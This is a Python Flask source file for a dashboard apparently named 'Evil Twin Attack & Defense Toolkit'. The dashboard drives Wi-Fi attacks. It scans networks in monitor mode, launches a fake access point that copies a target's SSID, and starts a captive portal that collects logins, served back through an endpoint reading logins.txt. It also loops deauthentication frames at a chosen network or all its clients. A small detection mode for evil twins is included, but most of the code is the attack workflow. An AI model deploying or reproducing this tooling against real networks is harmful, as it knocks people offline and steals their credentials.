import sys
import os
import time
import threading
import subprocess
from datetime import datetime
import queue
from flask import Flask, render_template, jsonify, request, Response

# Add attack and defense folders to python path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), 'attack')))
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), 'defense')))

# Import toolkit modules
from find_target import scan_wifi_networks_non_interactive
from dhcp_server import start_captive_portal
from deauthentication_attack import send_single_deauth
from identify_evil_twin_attack import scan_wifi, detect_evil_twin

app = Flask(__name__)

# Global state
log_queue = queue.Queue()
latest_scan_results = {"access_points": {}, "clients": {}}
state = {
    "is_scanning": False,
    "ap_active": False,
    "portal_active": False,
    "deauth_active": False,
    "defense_active": False,
    "adapter_interface": "wlp4s0f4u1",
    "my_interface": "wlp2s0",
    "selected_bssid": "",
    "selected_ssid": "",
    "selected_client": "",
}

# Redirect stdout to capture all prints
class StdoutRedirector:
    def __init__(self, original_stdout):
        self.original_stdout = original_stdout
    def write(self, message):
        self.original_stdout.write(message)
        clean_msg = message.strip()
        if clean_msg:
            timestamp = datetime.now().strftime("%H:%M:%S")
            log_queue.put(f"[{timestamp}] {clean_msg}")
    def flush(self):
        self.original_stdout.flush()

sys.stdout = StdoutRedirector(sys.stdout)

# Scripts paths
MONITOR_SCRIPT = "./change_interface_mode/set_monitor.sh"
MANAGED_SCRIPT = "./change_interface_mode/set_managed.sh"
MASTER_SCRIPT = "./change_interface_mode/set_master.sh"
HOSTAPD_CONFIG = "./attack/hostapd.conf"
HOSTAPD_PID_FILE = "hostapd.pid"

def run_command_log(cmd):
    print(f"[*] Running: {' '.join(cmd)}")
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, check=True)
        if res.stdout:
            print(res.stdout)
        return True
    except subprocess.CalledProcessError as e:
        print(f"❌ Command failed: {e}\nStderr: {e.stderr}")
        return False

def interface_exists(iface):
    # Returns True if interface is found in the system
    try:
        with open("/proc/net/dev", "r") as f:
            devices = f.read()
        return iface in devices
    except Exception:
        # Fallback to ip link
        try:
            res = subprocess.run(["ip", "link", "show", iface], capture_output=True, text=True)
            return res.returncode == 0
        except Exception:
            return False

# Cleanup function for interfaces and hostapd
def cleanup_all():
    print("[*] Performing full system cleanup...")
    # Kill hostapd
    if os.path.isfile(HOSTAPD_PID_FILE):
        try:
            with open(HOSTAPD_PID_FILE, "r") as f:
                pid = f.read().strip()
            print(f"🛑 Killing hostapd process: {pid}")
            subprocess.run(["kill", "-9", pid], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.remove(HOSTAPD_PID_FILE)
        except Exception:
            pass

    # Kill remaining hostapd processes
    try:
        res = subprocess.run(
            f"ps aux | grep {HOSTAPD_CONFIG} | grep -v grep | awk '{{print $2}}'",
            shell=True, capture_output=True, text=True
        )
        pids = res.stdout.strip().splitlines()
        if pids:
            print(f"🛑 Killing extra hostapd processes: {' '.join(pids)}")
            subprocess.run(["kill", "-9"] + pids)
    except Exception:
        pass

    # Kill captive portal / python on port 80
    try:
        res = subprocess.run(
            ['lsof', '-t', '-i', ':80'],
            capture_output=True, text=True
        )
        pids = res.stdout.strip().splitlines()
        if pids:
            print(f"🛑 Killing captive portal web server (PIDs: {' '.join(pids)})")
            subprocess.run(["kill", "-9"] + pids)
    except Exception:
        pass

    # Safely clear iptables rules added by the captive portal
    print("[*] Clearing iptables firewall rules...")
    subprocess.run(["iptables", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["iptables", "-t", "nat", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Re-enable managed mode on attack interface safely
    if state["my_interface"]:
        run_command_log([MANAGED_SCRIPT, state["my_interface"]])
    if state["adapter_interface"]:
        run_command_log([MANAGED_SCRIPT, state["adapter_interface"]])
    
    state["ap_active"] = False
    state["portal_active"] = False
    state["deauth_active"] = False
    state["is_scanning"] = False
    print("[✓] Cleanup complete.")

def get_active_interfaces():
    interfaces = []
    try:
        # Check /proc/net/dev
        if os.path.exists("/proc/net/dev"):
            with open("/proc/net/dev", "r") as f:
                lines = f.readlines()
            for line in lines[2:]:
                parts = line.split(":")
                if len(parts) > 0:
                    iface = parts[0].strip()
                    if iface and iface != "lo":
                        interfaces.append(iface)
        else:
            # Fallback to ip link
            res = subprocess.run(["ip", "-o", "link", "show"], capture_output=True, text=True)
            for line in res.stdout.splitlines():
                parts = line.split(":")
                if len(parts) > 1:
                    iface = parts[1].strip()
                    if iface and iface != "lo":
                        interfaces.append(iface)
    except Exception:
        pass
    # Unique and sorted list
    return sorted(list(set(interfaces)))

@app.route('/api/interfaces')
def list_interfaces():
    return jsonify({"interfaces": get_active_interfaces()})

@app.route('/')
def index():
    return render_template('index.html')



@app.route('/api/state')
def get_state():
    return jsonify(state)

@app.route('/api/update-interfaces', methods=['POST'])
def update_interfaces():
    data = request.json
    state["adapter_interface"] = data.get("adapter_interface", state["adapter_interface"])
    state["my_interface"] = data.get("my_interface", state["my_interface"])
    state["selected_bssid"] = data.get("selected_bssid", state["selected_bssid"])
    state["selected_ssid"] = data.get("selected_ssid", state["selected_ssid"])
    state["selected_client"] = data.get("selected_client", state["selected_client"])
    print(f"[✓] Interfaces & Targets updated. Monitor: {state['adapter_interface']}, Master: {state['my_interface']}, Target SSID: {state['selected_ssid']}")
    return jsonify({"success": True})

@app.route('/api/scan', methods=['POST'])
def start_scan():
    if not interface_exists(state["adapter_interface"]):
        return jsonify({"success": False, "error": f"Monitor interface '{state['adapter_interface']}' not found"})
    if state["is_scanning"]:
        return jsonify({"success": False, "error": "Scan already in progress"})
    
    state["is_scanning"] = True
    def scan_thread():
        try:
            print(f"🚀 Enabling monitor mode on {state['adapter_interface']}...")
            if not run_command_log([MONITOR_SCRIPT, state['adapter_interface']]):
                state["is_scanning"] = False
                return
            
            print("🚀 Starting Wi-Fi Scan...")
            aps, cls = scan_wifi_networks_non_interactive(state['adapter_interface'], timeout=15)
            latest_scan_results["access_points"] = aps
            # Convert defaultdict to standard dict for JSON serialization
            latest_scan_results["clients"] = {k: list(v.values()) for k, v in cls.items()}
            print(f"[✓] Found {len(aps)} networks.")
        except Exception as e:
            print(f"❌ Scan error: {e}")
        finally:
            state["is_scanning"] = False

    threading.Thread(target=scan_thread, daemon=True).start()
    return jsonify({"success": True})

@app.route('/api/scan-results')
def get_scan_results():
    return jsonify(latest_scan_results)

@app.route('/api/start-ap', methods=['POST'])
def start_ap():
    if not interface_exists(state["my_interface"]):
        return jsonify({"success": False, "error": f"AP interface '{state['my_interface']}' not found"})
    if state["ap_active"]:
        return jsonify({"success": False, "error": "AP is already active"})
    
    data = request.json
    state["selected_bssid"] = data.get("bssid", "")
    state["selected_ssid"] = data.get("ssid", "")
    
    if not state["selected_ssid"]:
        return jsonify({"success": False, "error": "No SSID specified"})

    def ap_thread():
        try:
            state["ap_active"] = True
            print(f"🚀 Preparing interface {state['my_interface']} for master/AP mode...")
            run_command_log([MASTER_SCRIPT, state['my_interface']])
            
            print(f"🚀 Launching hostapd for SSID '{state['selected_ssid']}'...")
            subprocess.run(["bash", "./attack/start_network.sh", "run_function", "start_hostapd", state['my_interface'], state['selected_ssid']], check=True)
            print("[✓] hostapd fake access point successfully launched.")
        except Exception as e:
            print(f"❌ hostapd failed: {e}")
            state["ap_active"] = False

    threading.Thread(target=ap_thread, daemon=True).start()
    return jsonify({"success": True})

@app.route('/api/stop-ap', methods=['POST'])
def stop_ap():
    cleanup_all()
    return jsonify({"success": True})

@app.route('/api/start-portal', methods=['POST'])
def start_portal():
    if not interface_exists(state["my_interface"]):
        return jsonify({"success": False, "error": f"AP interface '{state['my_interface']}' not found"})
    if state["portal_active"]:
        return jsonify({"success": False, "error": "Captive Portal already active"})

    def portal_thread():
        try:
            state["portal_active"] = True
            print("⏳ Waiting for interface to stabilize...")
            time.sleep(1.5)
            print("🚀 Launching Captive Portal & DHCP server...")
            start_captive_portal(state['my_interface'])
        except Exception as e:
            print(f"❌ Captive Portal failed: {e}")
            state["portal_active"] = False

    threading.Thread(target=portal_thread, daemon=True).start()
    return jsonify({"success": True})

# Deauth flag to control stopping
deauth_stop_event = threading.Event()

@app.route('/api/start-deauth', methods=['POST'])
def start_deauth():
    if not interface_exists(state["adapter_interface"]):
        return jsonify({"success": False, "error": f"Monitor interface '{state['adapter_interface']}' not found"})
    if state["deauth_active"]:
        return jsonify({"success": False, "error": "Deauthentication attack already running"})

    data = request.json
    state["selected_bssid"] = data.get("bssid", state["selected_bssid"])
    state["selected_client"] = data.get("client_mac", "FF:FF:FF:FF:FF:FF") # Default to broadcast
    
    if not state["selected_bssid"]:
        return jsonify({"success": False, "error": "BSSID must be selected first"})

    deauth_stop_event.clear()
    state["deauth_active"] = True

    def deauth_thread():
        print(f"🚀 Starting Deauth Attack: AP={state['selected_bssid']} Client={state['selected_client']}")
        try:
            # We run a loop of small durations so we can stop it dynamically
            while not deauth_stop_event.is_set() and state["deauth_active"]:
                send_single_deauth(
                    interface=state["adapter_interface"],
                    bssid=state["selected_bssid"],
                    target_mac=state["selected_client"],
                    duration=5,
                    batch_count=15,
                    interval=0.05
                )
                time.sleep(0.5)
        except Exception as e:
            print(f"❌ Deauth Error: {e}")
        finally:
            state["deauth_active"] = False
            print("[✓] Deauth attack stopped.")

    threading.Thread(target=deauth_thread, daemon=True).start()
    return jsonify({"success": True})

@app.route('/api/stop-deauth', methods=['POST'])
def stop_deauth():
    deauth_stop_event.set()
    state["deauth_active"] = False
    return jsonify({"success": True})

# Defense thread variables
defense_stop_event = threading.Event()

@app.route('/api/start-defense', methods=['POST'])
def start_defense():
    if not interface_exists(state["adapter_interface"]):
        return jsonify({"success": False, "error": f"Monitor interface '{state['adapter_interface']}' not found"})
    if state["defense_active"]:
        return jsonify({"success": False, "error": "Defense mode already active"})

    defense_stop_event.clear()
    state["defense_active"] = True

    def defense_thread():
        print(f"🛡️ Starting Evil Twin Defense Monitor on {state['adapter_interface']}...")
        try:
            # Switch to monitor mode
            run_command_log([MONITOR_SCRIPT, state['adapter_interface']])
            
            while not defense_stop_event.is_set() and state["defense_active"]:
                print(f"\n🔍 Defense scanning on {state['adapter_interface']}...")
                networks = scan_wifi(state['adapter_interface'], timeout=8)
                detect_evil_twin(networks)
                time.sleep(2)
        except Exception as e:
            print(f"❌ Defense scanner error: {e}")
        finally:
            state["defense_active"] = False
            print("🛑 Defense monitor stopped.")

    threading.Thread(target=defense_thread, daemon=True).start()
    return jsonify({"success": True})

@app.route('/api/stop-defense', methods=['POST'])
def stop_defense():
    defense_stop_event.set()
    state["defense_active"] = False
    # Restore managed mode
    run_command_log([MANAGED_SCRIPT, state['adapter_interface']])
    return jsonify({"success": True})


@app.route('/api/credentials')
def get_credentials():
    logins = []
    log_file = "logins.txt"
    if os.path.isfile(log_file):
        try:
            with open(log_file, "r") as f:
                lines = f.readlines()
            for line in lines:
                if line.strip():
                    logins.append(line.strip())
        except Exception as e:
            print(f"⚠️ Error reading logins: {e}")
    return jsonify({"credentials": logins})

@app.route('/api/cleanup', methods=['POST'])
def trigger_cleanup():
    cleanup_all()
    return jsonify({"success": True})

# Server-Sent Events endpoint for real-time console updates
@app.route('/api/stream')
def stream_logs():
    def event_stream():
        # Yield initial message
        yield f"data: [Dashboard] Connected to real-time logs stream.\n\n"
        while True:
            try:
                # Block for a short time or yield
                msg = log_queue.get(timeout=1.0)
                yield f"data: {msg}\n\n"
            except queue.Empty:
                # Heartbeat to keep connection alive
                yield f"data: :keepalive\n\n"
            except Exception:
                break
    return Response(event_stream(), mimetype="text/event-stream")

if __name__ == '__main__':
    # Print intro
    print("==================================================")
    print("🔐 Evil Twin Attack & Defense Toolkit - Web Dashboard")
    print("URL: http://localhost:5001")
    print("Note: Must be run with sudo for interface control!")
    print("==================================================")
    
    app.run(host='0.0.0.0', port=5001, debug=False)

